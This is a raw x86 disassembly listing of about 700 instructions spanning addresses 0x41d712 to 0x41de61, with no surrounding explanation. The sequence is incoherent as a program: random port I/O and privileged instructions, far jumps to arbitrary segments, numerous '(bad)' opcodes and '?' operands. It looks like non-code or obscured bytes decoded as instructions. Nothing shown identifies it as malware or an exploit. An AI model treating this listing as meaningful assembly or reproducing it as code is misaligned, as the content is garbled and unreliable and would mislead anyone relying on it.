  41d712:	fistp  DWORD PTR [edi]
  41d714:	or     eax,0x8773294b
  41d719:	mov    ebx,0x94abc888
  41d71e:	cmp    DWORD PTR [ebp-0x16],0x53807c8b
  41d725:	sbb    al,0xf0
  41d727:	add    al,0xd8
  41d729:	and    esp,0x4d
  41d72c:	cmp    al,BYTE PTR ds:0x53c6d3b2
  41d732:	leave  
  41d733:	div    BYTE PTR [esi]
  41d735:	int3   
  41d736:	bound  ebp,QWORD PTR [ebx+eiz*4]
  41d739:	add    eax,0xf97475f
  41d73e:	call   0x803e:0xeae72611
  41d745:	inc    ebp
  41d746:	xchg   edi,eax
  41d747:	mov    DWORD PTR [esi],esp
  41d749:	lods   eax,DWORD PTR ds:[esi]
  41d74a:	in     eax,dx
  41d74b:	je     0x41d6ef
  41d74d:	adc    eax,0x35955b38
  41d752:	cmp    eax,0x1098952b
  41d757:	cs add al,0x2f
  41d75a:	nop
  41d75b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d75c:	ss pushf 
  41d75e:	mov    ds:0x266346b1,al
  41d763:	mov    bl,0xc8
  41d765:	xchg   ecx,eax
  41d766:	repz leave 
  41d768:	stc    
  41d769:	mov    edx,0x24143efe
  41d76e:	and    bh,BYTE PTR [ebp-0x3f]
  41d771:	dec    edx
  41d772:	inc    ebx
  41d773:	in     eax,dx
  41d774:	jmp    0x20c3:0xd1f1f55d
  41d77b:	leave  
  41d77c:	sbb    DWORD PTR [ebx-0xe6b9c12],edi
  41d782:	sbb    BYTE PTR [edi],al
  41d784:	nop
  41d785:	mov    edx,eax
  41d787:	(bad)  
  41d788:	in     eax,dx
  41d789:	adc    dh,BYTE PTR [esi-0x1a1f486a]
  41d78f:	out    dx,eax
  41d790:	jbe    0x41d7ab
  41d792:	cmp    eax,0xab774fd6
  41d797:	std    
  41d798:	mov    dh,0xf3
  41d79a:	mov    eax,0xcb7eaca2
  41d79f:	push   ebp
  41d7a0:	dec    esi
  41d7a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7a2:	rol    DWORD PTR [edi-0x5f3fe920],cl
  41d7a8:	fld    QWORD PTR [ebx+0x4fe4888c]
  41d7ae:	test   dl,ch
  41d7b0:	cdq    
  41d7b1:	mov    ecx,0xfd71541c
  41d7b6:	mov    eax,ds:0x1ea2cbb6
  41d7bb:	or     esp,DWORD PTR [eax]
  41d7bd:	and    al,0x8f
  41d7bf:	pop    ss
  41d7c0:	outs   dx,DWORD PTR ds:[esi]
  41d7c1:	shl    ch,cl
  41d7c3:	sbb    BYTE PTR [edx-0x45f7700a],ch
  41d7c9:	pop    ds
  41d7ca:	dec    ecx
  41d7cb:	jnp    0x41d7cb
  41d7cd:	into   
  41d7ce:	mov    BYTE PTR [ebp+0x55],0x51
  41d7d2:	push   esp
  41d7d3:	scas   al,BYTE PTR es:[edi]
  41d7d4:	scas   eax,DWORD PTR es:[edi]
  41d7d5:	push   esp
  41d7d6:	dec    DWORD PTR [esi-0x55]
  41d7d9:	mov    WORD PTR [esi],gs
  41d7db:	ror    ecx,cl
  41d7dd:	mov    es,WORD PTR [edi+edx*2+0x69]
  41d7e1:	mov    edx,0x5a3e890c
  41d7e6:	dec    esp
  41d7e7:	xor    eax,0x2e4914a5
  41d7ec:	out    dx,al
  41d7ed:	popf   
  41d7ee:	std    
  41d7ef:	rol    BYTE PTR [ebx+0x328b5a3c],0x6d
  41d7f6:	jecxz  0x41d81f
  41d7f8:	nop
  41d7f9:	mov    dl,0x60
  41d7fb:	xor    al,0x6e
  41d7fd:	vpcmpgtw ymm5,ymm3,YMMWORD PTR [esi-0xfa23325]
  41d805:	dec    ebp
  41d806:	sbb    al,0xa9
  41d808:	jb     0x41d845
  41d80a:	test   BYTE PTR [esi-0x2d67729d],ah
  41d810:	mov    ch,0xf
  41d812:	cmp    al,0x9a
  41d814:	jmp    0x41d80a
  41d816:	sub    ah,BYTE PTR [ecx+edi*1+0x2]
  41d81a:	aad    0xb7
  41d81c:	aas    
  41d81d:	push   cs
  41d81e:	sar    ah,0xa
  41d821:	aas    
  41d822:	xchg   ecx,eax
  41d823:	mov    bh,BYTE PTR [edi-0x51973cb0]
  41d829:	cli    
  41d82a:	push   ss
  41d82b:	scas   al,BYTE PTR es:[edi]
  41d82c:	xor    bh,0xde
  41d82f:	mov    ecx,0xcc26cd4f
  41d834:	adc    dh,al
  41d836:	mov    bl,0x2a
  41d838:	dec    esi
  41d839:	imul   ebp,DWORD PTR [ebx],0xffffff8b
  41d83c:	mov    dl,0x1d
  41d83e:	or     esp,ecx
  41d840:	pop    ebp
  41d841:	dec    ecx
  41d842:	sub    dh,BYTE PTR [ebp+ebx*1+0x16]
  41d846:	aas    
  41d847:	popf   
  41d848:	pushf  
  41d849:	out    0x30,al
  41d84b:	dec    eax
  41d84c:	cmp    BYTE PTR [edx+eiz*2],dh
  41d84f:	bnd js 0x41d89d
  41d852:	scas   al,BYTE PTR es:[edi]
  41d853:	dec    ecx
  41d854:	ja     0x41d8ce
  41d856:	mov    ecx,ebp
  41d858:	ins    DWORD PTR es:[edi],dx
  41d859:	inc    ebx
  41d85a:	jmp    0x8b0d:0xd47c554d
  41d861:	cmp    eax,0x7b90875
  41d866:	adc    esi,DWORD PTR [ebp-0x5]
  41d869:	cmc    
  41d86a:	xor    BYTE PTR [eax+0x7292505c],dh
  41d870:	dec    esp
  41d871:	push   cs
  41d872:	imul   ecx,DWORD PTR [ebp+0x3d],0x39e9218d
  41d879:	and    DWORD PTR [eax+0x1],0x7c1f96db
  41d880:	dec    ecx
  41d881:	movntq QWORD PTR [ecx-0x9a69f9b],mm0
  41d888:	jno    0x41d8bb
  41d88a:	in     eax,dx
  41d88b:	lds    eax,FWORD PTR [edi+0x6f]
  41d88e:	ss add al,0xcc
  41d891:	xchg   ebx,eax
  41d892:	xor    eax,0x399bce7b
  41d897:	dec    ebp
  41d898:	fcomp  DWORD PTR [edi-0x54d6b725]
  41d89e:	(bad)  
  41d89f:	mov    bh,0xe3
  41d8a1:	lods   eax,DWORD PTR ds:[esi]
  41d8a2:	cmp    esi,ebx
  41d8a4:	jecxz  0x41d8e9
  41d8a6:	js     0x41d894
  41d8a8:	cwde   
  41d8a9:	sub    eax,0x5399c42d
  41d8ae:	mov    bh,0x5f
  41d8b0:	push   ebp
  41d8b1:	xchg   esp,eax
  41d8b2:	xchg   DWORD PTR [ebx],edi
  41d8b4:	jmp    0x5bac6128
  41d8b9:	call   0x3735b012
  41d8be:	cwde   
  41d8bf:	mov    dl,0x9e
  41d8c1:	dec    esi
  41d8c2:	call   FWORD PTR [eax-0x5139b48]
  41d8c8:	jp     0x41d92f
  41d8ca:	jl     0x41d863
  41d8cc:	cld    
  41d8cd:	lock cmp eax,0x2e36d57a
  41d8d3:	arpl   si,sp
  41d8d5:	pop    edi
  41d8d6:	push   es
  41d8d7:	inc    esp
  41d8d8:	mov    BYTE PTR [edx-0x5189a01c],dl
  41d8de:	pushf  
  41d8df:	shl    BYTE PTR [edx],cl
  41d8e1:	test   BYTE PTR [esi+edx*8+0x4a],dl
  41d8e5:	je     0x41d93a
  41d8e7:	lds    ecx,FWORD PTR ds:0xba88848c
  41d8ed:	add    ecx,DWORD PTR [ecx+0x16]
  41d8f0:	clc    
  41d8f1:	pop    ss
  41d8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8f3:	jbe    0x41d935
  41d8f5:	push   cs
  41d8f6:	call   0x8af61950
  41d8fb:	pop    es
  41d8fc:	int    0x16
  41d8fe:	jge    0x41d8ba
  41d900:	loopne 0x41d934
  41d902:	jge    0x41d88f
  41d904:	inc    esi
  41d905:	push   es
  41d906:	enter  0xba84,0xd6
  41d90a:	cli    
  41d90b:	and    eax,DWORD PTR [ebx+esi*1-0x7341b602]
  41d912:	or     DWORD PTR [ecx+ebx*4+0x1b2e4a51],ebx
  41d919:	dec    ecx
  41d91a:	in     al,dx
  41d91b:	adc    eax,0x1a3615cb
  41d920:	sbb    DWORD PTR [edx+0xbe59c90],ebx
  41d926:	je     0x41d8d9
  41d928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d929:	or     BYTE PTR [ebx-0x7a],0xee
  41d92d:	das    
  41d92e:	sub    eax,0x7e6c733e
  41d933:	outs   dx,BYTE PTR ds:[esi]
  41d934:	frndint 
  41d936:	and    BYTE PTR [esi+edi*2+0x20466836],0xf7
  41d93e:	ds popf 
  41d940:	dec    esp
  41d941:	aaa    
  41d942:	xlat   BYTE PTR ds:[ebx]
  41d943:	icebp  
  41d944:	data16 aaa 
  41d946:	xchg   esi,eax
  41d947:	jb     0x41d944
  41d949:	jecxz  0x41d962
  41d94b:	ficomp WORD PTR [ebx-0x5b]
  41d94e:	push   ss
  41d94f:	xor    esi,ecx
  41d951:	sbb    al,0xde
  41d953:	mov    ebp,0x9b7d6d4c
  41d958:	out    0xbf,eax
  41d95a:	jge    0x41d957
  41d95c:	sar    DWORD PTR [eax+0x7e2bfbb],0x38
  41d963:	mov    bh,0xa
  41d965:	aaa    
  41d966:	cwde   
  41d967:	aad    0x20
  41d969:	jg     0x41d8f3
  41d96b:	test   DWORD PTR [edi+0x2f],ebx
  41d96e:	nop
  41d96f:	retf   
  41d970:	(bad)  
  41d971:	lea    ebp,[ebx+0x24]
  41d974:	pop    ebx
  41d975:	mov    cl,ch
  41d977:	scas   eax,DWORD PTR es:[edi]
  41d978:	push   ebx
  41d979:	dec    esi
  41d97a:	call   0x972852b2
  41d97f:	int    0xac
  41d981:	cmp    al,0xe9
  41d983:	scas   al,BYTE PTR es:[edi]
  41d984:	(bad)  
  41d985:	daa    
  41d986:	not    DWORD PTR [edx+0x4c2fed98]
  41d98c:	xchg   esi,eax
  41d98d:	sbb    ecx,ebp
  41d98f:	sub    eax,0x43680520
  41d994:	mov    al,0xe7
  41d996:	xlat   BYTE PTR ds:[ebx]
  41d997:	jmp    0x41d9ce
  41d999:	mov    ch,0xfd
  41d99b:	adc    edx,esi
  41d99d:	in     al,dx
  41d99e:	les    ecx,FWORD PTR fs:[edi+0x267bd08b]
  41d9a5:	scas   al,BYTE PTR es:[edi]
  41d9a6:	cmp    dl,dh
  41d9a8:	test   al,0x17
  41d9aa:	and    BYTE PTR [ebp-0x19e0955a],ah
  41d9b0:	jl     0x7e17896d
  41d9b6:	sbb    BYTE PTR [eax-0x19],bh
  41d9b9:	pop    ss
  41d9ba:	fwait
  41d9bb:	test   al,0xae
  41d9bd:	mov    BYTE PTR [ebx-0x5],bl
  41d9c0:	pop    edx
  41d9c1:	inc    esi
  41d9c2:	jne    0x41d9d1
  41d9c4:	cmp    eax,0xdabdc4f3
  41d9c9:	fidivr WORD PTR ds:0xabc0818f
  41d9cf:	mov    edx,0xc9b109ab
  41d9d4:	retf   
  41d9d5:	sti    
  41d9d6:	lods   eax,DWORD PTR ds:[esi]
  41d9d7:	fcom   DWORD PTR fs:[ecx]
  41d9da:	fidivr DWORD PTR [ebx-0x41]
  41d9dd:	and    ecx,DWORD PTR [ecx+0x44]
  41d9e0:	ins    DWORD PTR es:[edi],dx
  41d9e1:	(bad)  
  41d9e2:	pop    ss
  41d9e3:	jle    0x41d9f8
  41d9e5:	add    al,0x4d
  41d9e7:	xchg   ebx,eax
  41d9e8:	sbb    ebx,DWORD PTR [eax]
  41d9ea:	add    BYTE PTR [eax+eiz*2-0x771f6cf1],0x6f
  41d9f2:	inc    edi
  41d9f3:	mov    edi,0xf5d3e91e
  41d9f8:	icebp  
  41d9f9:	add    al,0xfb
  41d9fb:	es aaa 
  41d9fd:	ret    0xd1e3
  41da00:	xor    BYTE PTR [ecx],bl
  41da02:	iret   
  41da03:	test   esp,ebp
  41da05:	mov    eax,0xc02f56a7
  41da0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da0b:	mov    ah,0x15
  41da0d:	and    al,0xe7
  41da0f:	push   ss
  41da10:	mov    ebx,0x7514307c
  41da15:	push   ss
  41da16:	mov    cs,WORD PTR [edi+0x4d]
  41da19:	pop    esi
  41da1a:	mov    dl,0x66
  41da1c:	repnz leave 
  41da1e:	push   ecx
  41da1f:	ins    BYTE PTR es:[edi],dx
  41da20:	mov    ch,0x8d
  41da22:	jo     0x41da3a
  41da24:	aad    0x3b
  41da26:	iret   
  41da27:	sub    BYTE PTR [ebp+0x4b],ah
  41da2a:	add    DWORD PTR [ecx+0x60],0x2b538aa2
  41da31:	test   DWORD PTR [esi-0x3e9ea8c8],0x5a3a4fbc
  41da3b:	push   0xffffffb3
  41da3d:	fiadd  DWORD PTR [ecx+ecx*4]
  41da40:	push   cs
  41da41:	mov    BYTE PTR [ecx+0x4],0xf2
  41da45:	bound  ecx,QWORD PTR ss:[eax]
  41da48:	in     eax,0x75
  41da4a:	mov    dl,0x2
  41da4c:	ss cwde 
  41da4e:	call   0x1347c9a0
  41da53:	sbb    esp,DWORD PTR [esi]
  41da55:	pop    ecx
  41da56:	xor    edi,edi
  41da58:	sub    al,0x29
  41da5a:	add    bh,BYTE PTR [esi]
  41da5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da5d:	cdq    
  41da5e:	jg     0x41d9ed
  41da60:	mov    DWORD PTR [ebp+0x26],0x7289075c
  41da67:	jecxz  0x41daa1
  41da69:	jne    0x41d9fe
  41da6b:	mov    eax,ds:0xc25f78b5
  41da70:	lods   al,BYTE PTR ds:[esi]
  41da71:	outs   dx,DWORD PTR ds:[esi]
  41da72:	push   esp
  41da73:	mov    ds:0xd637d67,al
  41da78:	(bad)  
  41da79:	shl    esp,cl
  41da7b:	enter  0x4c9f,0x7b
  41da7f:	outs   dx,DWORD PTR ds:[esi]
  41da80:	sub    al,0x1f
  41da82:	add    eax,0xa9742e20
  41da87:	xchg   esp,eax
  41da88:	sbb    eax,0xaeedc1c8
  41da8d:	mov    ds:0xbd8f8a8a,eax
  41da92:	scas   eax,DWORD PTR es:[edi]
  41da93:	or     eax,DWORD PTR [ecx-0x7f03ac17]
  41da99:	lock inc edi
  41da9b:	mov    edx,0x89829ab9
  41daa0:	sub    eax,DWORD PTR [ebx]
  41daa2:	jns    0x41da84
  41daa4:	sbb    eax,0xc00220e6
  41daa9:	inc    ecx
  41daaa:	fild   QWORD PTR [eax-0x369ef3b2]
  41dab0:	mov    bh,0x3f
  41dab2:	adc    ebx,DWORD PTR [edi-0x62]
  41dab5:	ds scas al,BYTE PTR es:[edi]
  41dab7:	mov    eax,ds:0x149a24a5
  41dabc:	fsub   QWORD PTR [edx+0x38]
  41dabf:	push   ds
  41dac0:	jne    0x41da56
  41dac2:	sbb    BYTE PTR [edi+0x811dc48],cl
  41dac8:	(bad)
  41dacb:	jne    0x41da85
  41dacd:	pop    ecx
  41dace:	pushf  
  41dacf:	imul   ecx,eax,0xe1949324
  41dad5:	clc    
  41dad6:	jb     0x41db49
  41dad8:	mov    dl,0x26
  41dada:	cld    
  41dadb:	mov    dh,0x31
  41dadd:	sub    al,0xf3
  41dadf:	mov    esi,0xb138af07
  41dae4:	jecxz  0x41db2e
  41dae6:	lea    esi,[edx-0x72]
  41dae9:	cmp    ebx,DWORD PTR [eax-0x3525ee5d]
  41daef:	mov    ds:0x75bbacd3,eax
  41daf4:	retf   0xcf76
  41daf7:	mov    al,0xf0
  41daf9:	add    DWORD PTR [esi-0x68],esi
  41dafc:	push   eax
  41dafd:	add    ebx,ecx
  41daff:	sbb    al,0x57
  41db01:	inc    edx
  41db02:	leave  
  41db03:	data16 jl 0x41da91
  41db06:	add    BYTE PTR [edx],cl
  41db08:	(bad)  
  41db09:	loopne 0x41daaf
  41db0b:	mov    bh,0xc4
  41db0d:	mov    DWORD PTR [edi+edx*1+0x49],0x181a44e1
  41db15:	hlt    
  41db16:	sahf   
  41db17:	mov    BYTE PTR ds:0x44211bde,al
  41db1d:	mov    ?,ebx
  41db1f:	mov    esp,0x2b544b9d
  41db24:	xor    DWORD PTR [ecx],eax
  41db26:	cmp    DWORD PTR [edi-0xc],0xa6f39bb5
  41db2d:	jl     0x41db7f
  41db2f:	jno    0x41dafb
  41db31:	sbb    ch,cl
  41db33:	int    0x6b
  41db35:	mov    BYTE PTR [ebx-0x3b21421d],ch
  41db3b:	mov    dh,0x20
  41db3d:	(bad)  
  41db3e:	pop    ecx
  41db3f:	(bad)  
  41db40:	mov    esp,0x46d01cbc
  41db45:	cmc    
  41db46:	pop    ebx
  41db47:	jp     0x41db25
  41db49:	or     al,0xab
  41db4b:	cdq    
  41db4c:	daa    
  41db4d:	popa   
  41db4e:	aad    0x2d
  41db50:	inc    edx
  41db51:	inc    ebx
  41db52:	in     al,dx
  41db53:	ret    0x1851
  41db56:	cli    
  41db57:	dec    eax
  41db58:	jecxz  0x41dbbb
  41db5a:	mov    al,0xc0
  41db5c:	pop    ebx
  41db5d:	aas    
  41db5e:	pop    ebx
  41db5f:	mov    ah,BYTE PTR [ebx+edi*4+0x34434337]
  41db66:	sub    esi,DWORD PTR [ebp+0x6b]
  41db69:	cmp    DWORD PTR [ebx+0x37],eax
  41db6c:	sbb    ebx,edi
  41db6e:	mov    fs,WORD PTR [ebx]
  41db70:	xor    eax,0xf9ae5a03
  41db75:	adc    BYTE PTR [ecx],0x65
  41db78:	jl     0x41dbca
  41db7a:	int3   
  41db7b:	stos   BYTE PTR es:[edi],al
  41db7c:	cwde   
  41db7d:	inc    ebx
  41db7e:	pop    ds
  41db7f:	push   eax
  41db80:	adc    DWORD PTR [ebx+0x60dec597],0xffffffbc
  41db87:	sahf   
  41db88:	jmp    esp
  41db8a:	out    dx,eax
  41db8b:	scas   eax,DWORD PTR es:[edi]
  41db8c:	stos   BYTE PTR es:[edi],al
  41db8d:	jmp    0x41db54
  41db8f:	outs   dx,DWORD PTR ds:[esi]
  41db90:	dec    ecx
  41db91:	pop    esi
  41db92:	push   ebp
  41db93:	in     al,0xa0
  41db95:	inc    edi
  41db96:	mov    ds:0x9f339e28,al
  41db9b:	sbb    al,0x63
  41db9d:	inc    esi
  41db9e:	in     al,dx
  41db9f:	pop    esi
  41dba0:	pop    edi
  41dba1:	sub    dl,BYTE PTR [edx]
  41dba3:	mov    cs,esp
  41dba5:	cmp    al,0xe7
  41dba7:	pop    ds
  41dba8:	lea    edx,[edi]
  41dbaa:	in     al,dx
  41dbab:	dec    ecx
  41dbac:	or     DWORD PTR [ebp-0x2a8700d7],edi
  41dbb2:	js     0x41dbf7
  41dbb4:	xchg   edi,eax
  41dbb5:	mov    esi,0x194c9c4b
  41dbba:	adc    DWORD PTR [ecx+0x53],0x6a
  41dbbe:	cld    
  41dbbf:	cmp    DWORD PTR [ebx],edi
  41dbc1:	jle    0x41db94
  41dbc3:	out    dx,eax
  41dbc4:	push   ebp
  41dbc5:	mov    edx,DWORD PTR [eax+ebp*2]
  41dbc8:	repnz mov cl,bl
  41dbcb:	adc    BYTE PTR [edi-0x1f],0xdd
  41dbcf:	inc    ecx
  41dbd0:	xchg   edi,eax
  41dbd1:	repz xchg ebp,eax
  41dbd3:	adc    ecx,DWORD PTR [ebp-0x12]
  41dbd6:	mov    esi,0xce572ea2
  41dbdb:	daa    
  41dbdc:	addr16 jmpw 0xd286
  41dbe1:	scas   al,BYTE PTR es:[edi]
  41dbe2:	and    eax,DWORD PTR [ecx-0x35c00219]
  41dbe8:	xchg   edx,eax
  41dbe9:	mov    dh,0x2
  41dbeb:	sub    al,0xbd
  41dbed:	jl     0x41dbc9
  41dbef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbf0:	pop    edx
  41dbf1:	jp     0x41dbbc
  41dbf3:	sub    DWORD PTR [ebx-0x22b7158e],esp
  41dbf9:	or     DWORD PTR [edi-0x95e41cc],eax
  41dbff:	repz (bad) 
  41dc01:	aas    
  41dc02:	and    DWORD PTR [esi],esp
  41dc04:	pop    DWORD PTR [ecx+esi*2]
  41dc07:	mov    esp,0x4dc5b6d
  41dc0c:	sbb    eax,0x813332c0
  41dc11:	or     eax,0xb40d4d92
  41dc16:	pop    ds
  41dc17:	std    
  41dc18:	out    dx,eax
  41dc19:	aaa    
  41dc1a:	and    al,0x8a
  41dc1c:	loop   0x41dc27
  41dc1e:	test   al,0x4
  41dc20:	sbb    cl,0xd6
  41dc23:	cmp    eax,0x81285f4
  41dc28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc29:	dec    esi
  41dc2a:	sbb    al,0xbe
  41dc2c:	cli    
  41dc2d:	int    0x8c
  41dc2f:	fsub   QWORD PTR [edx-0x63]
  41dc32:	or     al,0x5a
  41dc34:	fimul  WORD PTR [ecx]
  41dc36:	dec    esp
  41dc37:	out    dx,al
  41dc38:	sub    eax,0xe3a55b99
  41dc3d:	int3   
  41dc3e:	mov    eax,ds:0x1a7d5730
  41dc43:	xchg   ebx,eax
  41dc44:	mov    ebp,0xcff935d9
  41dc49:	outs   dx,BYTE PTR cs:[esi]
  41dc4b:	jb     0x41dcbe
  41dc4d:	add    ebp,DWORD PTR [eax+ecx*4-0x24]
  41dc51:	and    al,0x31
  41dc53:	pop    ss
  41dc54:	xchg   ecx,eax
  41dc55:	xchg   edx,eax
  41dc56:	push   0x25
  41dc58:	push   esi
  41dc59:	inc    edi
  41dc5a:	pop    ebp
  41dc5b:	js     0x41dc5f
  41dc5d:	cmc    
  41dc5e:	fild   WORD PTR [eax]
  41dc60:	repz jae 0x41dc36
  41dc63:	mov    esi,0x1763ab1c
  41dc68:	inc    edx
  41dc69:	test   DWORD PTR [ebx+0x7c],ecx
  41dc6c:	je     0x41dc35
  41dc6e:	and    edx,DWORD PTR [esi+0x36]
  41dc71:	shr    DWORD PTR [ebp-0x3a7e88f4],1
  41dc77:	mov    eax,0x6be1627e
  41dc7c:	out    dx,eax
  41dc7d:	popf   
  41dc7e:	enter  0xef86,0xf0
  41dc82:	xchg   ecx,eax
  41dc83:	in     eax,0x80
  41dc85:	mov    bh,BYTE PTR [edx-0x22f561a2]
  41dc8b:	aaa    
  41dc8c:	sahf   
  41dc8d:	push   ds
  41dc8e:	cmp    BYTE PTR [eax],0xa5
  41dc91:	inc    esp
  41dc92:	sub    DWORD PTR [ebp+0x7a],ecx
  41dc95:	mov    cl,0x55
  41dc97:	xchg   ebx,eax
  41dc98:	push   es
  41dc99:	inc    edx
  41dc9a:	outs   dx,BYTE PTR ds:[esi]
  41dc9b:	shl    ch,0xc1
  41dc9e:	mov    ebx,0x4cf35532
  41dca3:	dec    esi
  41dca4:	jl     0x41dc33
  41dca6:	add    eax,0x66bce75f
  41dcab:	add    dh,ch
  41dcad:	sub    al,0x4f
  41dcaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcb0:	in     eax,0x5b
  41dcb2:	test   BYTE PTR [edx-0x25f30d9a],0x82
  41dcb9:	pop    ecx
  41dcba:	sahf   
  41dcbb:	mov    esi,0xafa3b3c6
  41dcc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcc1:	pop    esp
  41dcc2:	popf   
  41dcc3:	cs ins DWORD PTR es:[edi],dx
  41dcc5:	cld    
  41dcc6:	mov    cl,0xf
  41dcc8:	mov    DWORD PTR [eax],edx
  41dcca:	mov    edi,0xb540ca7b
  41dccf:	mov    eax,0xa4607364
  41dcd4:	fwait
  41dcd5:	push   ss
  41dcd6:	mov    al,ds:0x1a11b99d
  41dcdb:	lods   al,BYTE PTR ds:[esi]
  41dcdc:	add    edx,DWORD PTR [esi+0x29]
  41dcdf:	lods   eax,DWORD PTR ds:[esi]
  41dce0:	lods   al,BYTE PTR ds:[esi]
  41dce1:	sbb    esp,DWORD PTR [ebx+0x45]
  41dce4:	arpl   WORD PTR [ecx+0x6f],sp
  41dce7:	cmp    bh,BYTE PTR [eax+0x22]
  41dcea:	add    BYTE PTR [edx],ch
  41dcec:	clc    
  41dced:	mov    BYTE PTR [edx+edx*1-0x30299bea],dh
  41dcf4:	rcr    ebx,0xdd
  41dcf7:	inc    edx
  41dcf8:	jl     0x41dd3c
  41dcfa:	out    dx,al
  41dcfb:	xor    BYTE PTR [ebx],dl
  41dcfd:	nop
  41dcfe:	xchg   ebx,eax
  41dcff:	dec    edx
  41dd00:	sbb    al,0xbb
  41dd02:	mov    ds:0xf34ff9d0,al
  41dd07:	arpl   WORD PTR [edx-0x31500bbd],cx
  41dd0d:	psraw  mm1,QWORD PTR [edx+esi*8]
  41dd11:	ret    
  41dd12:	test   BYTE PTR [ecx+0x34],ch
  41dd15:	push   ds
  41dd16:	jge    0x41dcc0
  41dd18:	push   cs
  41dd19:	je     0x41dced
  41dd1b:	aad    0x9
  41dd1d:	and    al,0x1a
  41dd1f:	sub    al,0x90
  41dd21:	cmc    
  41dd22:	mov    edi,0x7234965c
  41dd27:	xchg   ebx,eax
  41dd28:	mov    WORD PTR [ecx+0x38],?
  41dd2b:	rcl    DWORD PTR [eax],1
  41dd2d:	mov    BYTE PTR ds:0x30368272,al
  41dd33:	xchg   ebx,eax
  41dd34:	mov    ?,WORD PTR [ebx-0x25c0b743]
  41dd3a:	push   ebx
  41dd3b:	sub    eax,0x59b41569
  41dd40:	popa   
  41dd41:	mov    ebx,0x7e62f93a
  41dd46:	sub    esp,0xf0b6f5c5
  41dd4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd4d:	pusha  
  41dd4e:	call   FWORD PTR [ecx+ecx*8+0x20]
  41dd52:	and    al,0x6d
  41dd54:	and    BYTE PTR [ecx+0x1f6fbd02],dl
  41dd5a:	jns    0x41dd50
  41dd5c:	sti    
  41dd5d:	jle    0x41ddca
  41dd5f:	sahf   
  41dd60:	retf   
  41dd61:	lods   al,BYTE PTR ds:[esi]
  41dd62:	sbb    eax,0x229a055b
  41dd67:	push   ebx
  41dd68:	in     al,0xbc
  41dd6a:	jmp    0x3157:0xbcd3c4c0
  41dd71:	sbb    BYTE PTR [esi-0x3c180c75],0x84
  41dd78:	dec    eax
  41dd79:	adc    ch,al
  41dd7b:	xor    eax,0x2e73a768
  41dd80:	and    ch,BYTE PTR [edi]
  41dd82:	test   edi,0xbee56c35
  41dd88:	stos   DWORD PTR es:[edi],eax
  41dd89:	mov    esp,DWORD PTR [edi+0x29]
  41dd8c:	push   esp
  41dd8d:	xchg   edx,eax
  41dd8e:	ds or  al,0x1a
  41dd91:	adc    ebp,esp
  41dd93:	repz mov cl,0x1a
  41dd96:	div    DWORD PTR [esi+0xc]
  41dd99:	cdq    
  41dd9a:	cdq    
  41dd9b:	cdq    
  41dd9c:	loopne 0x41dda3
  41dd9e:	xchg   BYTE PTR [ebp-0x68],al
  41dda1:	jl     0x41dd4c
  41dda3:	push   esp
  41dda4:	jg     0x41dd5c
  41dda6:	jo     0x41ddfa
  41dda8:	(bad)  
  41dda9:	mov    BYTE PTR ds:0xcb513cbd,dh
  41ddaf:	pop    ebp
  41ddb0:	ret    0xfee5
  41ddb3:	stos   BYTE PTR es:[edi],al
  41ddb4:	or     esp,DWORD PTR [edi+edi*1+0x72ff7948]
  41ddbb:	arpl   WORD PTR [ebx-0x65509e08],di
  41ddc1:	xchg   esi,eax
  41ddc2:	fisub  WORD PTR [ecx+edx*2]
  41ddc5:	daa    
  41ddc6:	mov    ds:0x44d458e2,al
  41ddcb:	and    DWORD PTR [esi+0x6e],ecx
  41ddce:	test   cl,dl
  41ddd0:	(bad)  
  41ddd1:	repz xchg edi,eax
  41ddd3:	fwait
  41ddd4:	pop    ebx
  41ddd5:	mov    dh,0x9c
  41ddd7:	cdq    
  41ddd8:	mov    bh,0x3f
  41ddda:	fxch   st(5)
  41dddc:	fst    DWORD PTR [ecx]
  41ddde:	xor    al,0x8a
  41dde0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dde1:	and    ebx,ebp
  41dde3:	iret   
  41dde4:	iret   
  41dde5:	pop    ecx
  41dde6:	sbb    eax,0x4c8edde
  41ddeb:	pop    edi
  41ddec:	loopne 0x41dde2
  41ddee:	fcom   DWORD PTR [esp+esi*2-0x16]
  41ddf2:	call   0xceb77a8e
  41ddf7:	mov    esi,0x204bf9cd
  41ddfc:	aam    0xa6
  41ddfe:	(bad)  
  41ddff:	scas   al,BYTE PTR es:[edi]
  41de00:	repnz sub al,0xb5
  41de03:	cmc    
  41de04:	lock xor BYTE PTR [ebx],ch
  41de07:	bound  edx,QWORD PTR [ebp-0x3b]
  41de0a:	mov    ebx,ebx
  41de0c:	icebp  
  41de0d:	fnstcw WORD PTR [ecx-0x15]
  41de10:	add    BYTE PTR [ecx],al
  41de12:	lahf   
  41de13:	sbb    eax,DWORD PTR [ebx]
  41de15:	mov    ds:0xf1f52114,eax
  41de1a:	aam    0x66
  41de1c:	cld    
  41de1d:	dec    ebx
  41de1e:	jge    0x41ddbe
  41de20:	das    
  41de21:	and    al,0xdc
  41de24:	sub    DWORD PTR [esi*2-0x7e37517f],esp
  41de2b:	loop   0x41ddec
  41de2d:	jne    0x41de59
  41de2f:	mov    ds:0x28dba964,al
  41de34:	mov    ds:0xde298259,eax
  41de39:	xlat   BYTE PTR ds:[ebx]
  41de3a:	test   ebp,esp
  41de3c:	lods   eax,DWORD PTR ds:[esi]
  41de3d:	jmp    0xb8601a5a
  41de42:	data16 xor cl,BYTE PTR [esi-0x15]
  41de46:	not    DWORD PTR [edi+edx*8+0x1b]
  41de4a:	test   DWORD PTR [ebx+0x1a],eax
  41de4d:	sbb    DWORD PTR [eax],ebx
  41de4f:	pop    ebx
  41de50:	jle    0x41de2f
  41de52:	push   cs
  41de53:	sub    al,0x19
  41de55:	bound  ecx,QWORD PTR [bx+di]
  41de58:	xchg   BYTE PTR fs:[esi-0x78b1cbb7],dh
  41de5f:	jl     0x41ddeb
  41de61:	(bad)  
